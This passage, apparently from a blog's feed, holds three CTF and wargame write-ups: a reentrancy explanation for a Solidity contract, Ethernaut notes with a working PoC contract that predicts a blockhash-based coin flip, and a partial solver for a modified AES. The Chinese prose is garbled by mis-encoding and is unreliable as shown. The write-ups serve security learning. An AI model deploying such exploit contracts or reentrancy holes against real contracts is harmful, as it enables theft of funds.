allowance&quot;</span><br><span class="line">        );</span><br><span class="line">        balanceOf[from] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        allowance[from][msg.sender] -= amount;</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendEth(address payable to, uint256 amount) private &#123;</span><br><span class="line">        (bool success, ) = to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;failed to send ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨withdrawAllçš„æ—¶å€™è§¦å‘ï¼Œå…ˆè½¬è´¦ï¼Œåwithdrawï¼Œæ‰€ä»¥å¯ä»¥åœ¨receiveå†è°ƒç”¨è¿™ä¸ªwithdrawAllå‡½æ•°å¯¼è‡´å¤šæ¬¡æ‰§è¡Œæ“ä½œã€‚</p>]]></content>
    
    
    <summary type="html">åŒºå—é“¾å…¥é—¨</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="åŒºå—é“¾" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://www.pri87.vip/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://www.pri87.vip/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>åŒºå—é“¾å®‰å…¨0-å…¥é—¨</title>
    <link href="https://www.pri87.vip/posts/3cedd4ae.html"/>
    <id>https://www.pri87.vip/posts/3cedd4ae.html</id>
    <published>2025-02-09T06:42:19.000Z</published>
    <updated>2025-02-19T19:45:32.264Z</updated>
    
    <content type="html"><![CDATA[<h1>äº¤äº’</h1><h2 id="ä»¥å¤ªåŠç”Ÿæ€">ä»¥å¤ªåŠç”Ÿæ€</h2><p>ä»¥å¤ªåŠæ˜¯ä¸€ä¸ªå»ä¸­å¿ƒåŒ–,å¼€æºä¸”å…·å¤‡æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„å…¬å…±åŒºå—é“¾å¹³å°.</p><h2 id="MetaMask">MetaMask</h2><p>é’±åŒ…</p><h2 id="åŠ©è®°è¯-Seed-ç§é’¥-å…¬é’¥-åœ°å€">åŠ©è®°è¯/Seed/ç§é’¥/å…¬é’¥/åœ°å€</h2><p>åŠ©è®°è¯â€”Seedç§å­(å¯é€†)<br>ç”Ÿæˆç§é’¥(å•å‘)<br>ç”Ÿæˆå…¬é’¥<br>ç”Ÿæˆåœ°å€</p><h2 id="è½¬è´¦">è½¬è´¦</h2><h2 id="æ™ºèƒ½åˆçº¦">æ™ºèƒ½åˆçº¦</h2><p>ä½¿ä»¥å¤ªç½‘ç”Ÿæ€æœ‰å›¾çµå®Œå¤‡æ€§</p><h3 id="REMIX">REMIX</h3><p>ä½¿ç”¨çš„è¯­è¨€:solidity</p><p>inject Provider - MetaMask<br>è¿æ¥Remixå’ŒMetaMask</p><h1>åˆ·é¢˜</h1><p><a href="https://ethernaut.openzeppelin.com/level/1">The Ethernaut - Fallback</a></p><h3 id="Fallback">Fallback</h3><p>æ™ºèƒ½åˆçº¦ä¹Ÿæ˜¯è´¦æˆ·ï¼Œå¯ä»¥ç›´æ¥è½¬è´¦</p><h3 id="Fallout">Fallout</h3><p>é™¤äº†constructorå‡½æ•°ä»¥å¤–ï¼Œæ‰€æœ‰å‡½æ•°éƒ½å¯ä»¥è°ƒç”¨ï¼Œåœ¨0.8ç‰ˆæœ¬ä¹‹å‰ï¼Œå¦‚æœæ‹¼é”™äº†æ„é€ å‡½æ•°ï¼Œä¼šå¯¼è‡´è¿™ä¸ªå‡½æ•°å¯ä»¥è¢«ç›´æ¥è°ƒç”¨</p><h3 id="Coin-Flip">Coin Flip</h3><p>ç”±äºåŒºå—é“¾ä¸­çš„å¾ˆå¤šæ•°æ®æ˜¯å¯¹æ‰€æœ‰äººå¯è§çš„ï¼ŒåŸºäºè¿™äº›å¯è§æ•°æ®è¿›è¡Œçš„ä¼ªéšæœºå¯ä»¥å¾ˆè½»æ¾åœ°è¢«é¢„æµ‹åˆ°ä¸‹ä¸€ä¸ªéšæœºæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract PoC &#123;</span><br><span class="line">    CoinFlip target;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function flip() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">åŒºå—é“¾å…¥é—¨</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="åŒºå—é“¾" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://www.pri87.vip/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://www.pri87.vip/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>æ¹˜å²šæ¯RE-å¤ç°&lt;1997&gt;</title>
    <link href="https://www.pri87.vip/posts/b119ee64.html"/>
    <id>https://www.pri87.vip/posts/b119ee64.html</id>
    <published>2025-01-29T05:26:50.000Z</published>
    <updated>2025-01-29T05:43:40.516Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1997">1997</h2><p>è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªé­”æ”¹çš„AESï¼Œå…·ä½“é€»è¾‘å¾ˆæ¸…æ¥šï¼Œç”šè‡³è¿˜æœ‰ç¬¦å·è¡¨</p><p>ä½†æ˜¯ä¸­é—´è¿™é‡Œæ²¡æƒ³åˆ°æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥é€†å‘ï¼Œæ‰€ä»¥ç›´æ¥çˆ†ç ´äº†</p><p>åˆ—æ··æ·†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  t = tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">1</span>] ^ tmp[i] ^ tmp[i + <span class="number">3</span>];</span><br><span class="line">  ciphertext[i] = t ^ tmp[i] ^ mul2(tmp[i] ^ tmp[i + <span class="number">1</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">1</span>] = t ^ tmp[i + <span class="number">1</span>] ^ mul2(tmp[i + <span class="number">1</span>] ^ tmp[i + <span class="number">2</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">2</span>] = t ^ tmp[i + <span class="number">2</span>] ^ mul2(tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">3</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">3</span>] = t ^ tmp[i + <span class="number">3</span>] ^ mul2(tmp[i + <span class="number">3</span>] ^ tmp[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> __cdecl <span class="title function_">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (a &amp; <span class="number">0x80</span>u) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * a;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">2</span> * a) ^ <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tmpæ˜¯è¾“å…¥å€¼ï¼Œciphertextæ˜¯è¾“å‡ºå€¼ï¼Œè¿™é‡Œå·²çŸ¥ciphertextï¼Œæƒ³æ±‚tmpï¼Œæƒ³äº†ä¸€ä¸‹ç›¸äº’çš„å…³ç³»ï¼Œå‘ç°ciphertextç›¸äº’å¼‚æˆ–å°±æ˜¯tï¼Œæ‰€ä»¥æˆ‘å°è¯•çˆ†ç ´tmpçš„å€¼ï¼Œç”±äºæ¯ä¸ªtmpæ˜¯8ä½ï¼Œæ¯ä¸¤ä¸ªè¿›è¡Œä¸€æ¬¡æ£€æŸ¥ï¼Œæ‰€ä»¥ç›¸å½“äºæ˜¯çˆ†16ä½ï¼Œä½æ•°æ¯”è¾ƒå°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cToTmp</span><span class="params">(<span class="type">uint8_t</span>* tmp, <span class="type">uint8_t</span>* c)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint8_t</span> t = c[i + <span class="number">2</span>] ^ c[i + <span class="number">1</span>] ^ c[i] ^ c[i + <span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t0 = <span class="number">0</span>; t0 &lt;= <span class="number">256</span>; t0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t1 = <span class="number">0</span>; t1 &lt;= <span class="number">256</span>; t1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] == (t ^ t0 ^ mul2(t0 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t2 = <span class="number">0</span>; t2 &lt;= <span class="number">256</span>; t2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">1</span>] == (t ^ t1 ^ mul2(t2 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t3 = <span class="number">0</span>; t3 &lt;= <span class="number">256</span>; t3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">2</span>] == (t ^ t2 ^ mul2(t2 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">3</span>] == (t ^ t3 ^ mul2(t0 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line">tmp[i] = t0;</span><br><span class="line">tmp[i + <span class="number">1</span>] = t1;</span><br><span class="line">tmp[i + <span class="number">2</span>] = t2;</span><br><span class="line">tmp[i + <span class="number">3</span>] = t3;</span><br><span class="line"><span class="comment">//printf(&quot;%x %x %x %x\n&quot;, tmp[i], tmp[i + 1], tmp[i + 2], tmp[i + 3]);</span></span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">next:;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæµ‹è¯•ä¸‹æ¥ç¡®å®å¯ä»¥å¾—åˆ°ä¸€å¼€å§‹çš„ç­”æ¡ˆï¼Œæ‰€ä»¥æœ€å</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line"><span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line"><span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line"><span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span 